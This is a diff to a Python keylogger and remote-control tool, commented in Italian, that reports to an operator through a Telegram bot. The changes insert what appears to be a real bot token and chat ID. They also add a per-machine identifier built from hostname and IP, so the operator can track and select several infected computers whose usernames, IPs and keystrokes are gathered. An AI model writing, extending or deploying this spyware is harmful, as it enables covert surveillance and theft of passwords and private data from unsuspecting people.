@@ -11,8 +11,8 @@ import subprocess
 from datetime import datetime
 
 # Configurazione del bot Telegram
-TOKEN = 'YOUR_TOKEN'  # Sostituisci con il token del tuo bot
-CHAT_ID = 'YOUR_CHATID'  # Sostituisci con il tuo chat ID
+TOKEN = '7752928416:AAGMJGxwFDM8n6GED2SpMyzYsjGej2P_-74'  # Sostituisci con il token del tuo bot
+CHAT_ID = '5726194160'  # Sostituisci con il tuo chat ID
 bot = telebot.TeleBot(TOKEN)
 
 # Variabile per memorizzare i tasti premuti
@@ -31,18 +31,28 @@ STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Sta
 active_users = {}
 
 
+# Funzione per generare un identificatore unico per ogni istanza
+def get_unique_identifier():
+    return f"{socket.gethostname()}_{socket.gethostbyname(socket.gethostname())}"
+
+
 # Funzione per inviare un messaggio all'avvio
 def send_startup_message():
     current_date = datetime.now().strftime("%d/%m/%Y")
     current_time = datetime.now().strftime("%H:%M:%S")
     username = get_windows_username()
     ip_address = socket.gethostbyname(socket.gethostname())
+    unique_id = get_unique_identifier()
 
     # Aggiungi l'utente alla lista degli utenti attivi
-    active_users[username] = ip_address
+    active_users[unique_id] = {
+        'username': username,
+        'ip_address': ip_address,
+        'start_time': f"{current_date} {current_time}"
+    }
 
     # Crea il messaggio
-    message = f"🟢 Il programma è stato avviato.\n\n📅 Data: {current_date}\n⏰ Ora: {current_time}\n👤 Nome utente: {username}\n🌐 Indirizzo IP: {ip_address}"
+    message = f"🟢 Il programma è stato avviato.\n\n📅 Data: {current_date}\n⏰ Ora: {current_time}\n👤 Nome utente: {username}\n🌐 Indirizzo IP: {ip_address}\n🆔 ID: {unique_id}"
     # Invia il messaggio al bot
     bot.send_message(CHAT_ID, message)
 
@@ -154,12 +164,12 @@ def generate_help_message():
 /panic 🟢 READY
 /taskkill 🟢 READY
 /shutdown 🟢 READY
-/users 🟢 READY
-/selectuser 🟢 READY
+/users 🟡 READY
+/selectuser 🟡 READY
 /help 🟢 READY
 
 🟢 READY: Comando funzionante
-🟡 PROGRESS: Comando in sviluppo
+🟡 PROGRESS: Comando in sviluppo / comando i BETA
 🔴 DONT WORK: Comando non funzionante
 """
     return help_message
@@ -170,17 +180,17 @@ def show_active_users():
     if not active_users:
         return "Nessun utente attivo."
     users_list = "👥 **Utenti Attivi**\n"
-    for username, ip_address in active_users.items():
-        users_list += f"- 👤 {username} | 🌐 {ip_address}\n"
+    for unique_id, user_info in active_users.items():
+        users_list += f"- 👤 {user_info['username']} | 🌐 {user_info['ip_address']} | 🆔 {unique_id}\n"
     return users_list
 
 
 # Funzione per selezionare un utente specifico
-def select_user(username):
-    if username in active_users:
-        return f"Utente selezionato: {username}"
+def select_user(unique_id):
+    if unique_id in active_users:
+        return f"Utente selezionato: {active_users[unique_id]['username']} (ID: {unique_id})"
     else:
-        return f"Utente {username} non trovato."
+        return f"Utente con ID {unique_id} non trovato."
 
 
 # Gestore dei messaggi per avviare/fermare il keylogger, richiedere informazioni, PANIC, TASKKILL, SHUTDOWN, USERS, SELECTUSER e HELP
@@ -192,8 +202,9 @@ def handle_message(message):
         if not keylogger_active:
             keylogger_active = True
             username = get_windows_username()
+            unique_id = get_unique_identifier()
             threading.Thread(target=start_keylogger, daemon=True).start()
-            bot.reply_to(message, f"Keylogger avviato. Nome utente: {username}.")
+            bot.reply_to(message, f"Keylogger avviato. Nome utente: {username}. ID: {unique_id}")
         else:
             bot.reply_to(message, "Il keylogger è già attivo.")
 
@@ -234,11 +245,11 @@ def handle_message(message):
     elif message.text.strip().upper().startswith("/SELECTUSER"):
         parts = message.text.strip().split()
         if len(parts) == 2:
-            username = parts[1]
-            response = select_user(username)
+            unique_id = parts[1]
+            response = select_user(unique_id)
             bot.reply_to(message, response)
         else:
-            bot.reply_to(message, "Formato comando non valido. Usa: /selectuser <nome_utente>")
+            bot.reply_to(message, "Formato comando non valido. Usa: /selectuser <unique_id>")
 
     elif message.text.strip().upper() == "/HELP":
         help_message = generate_help_message()
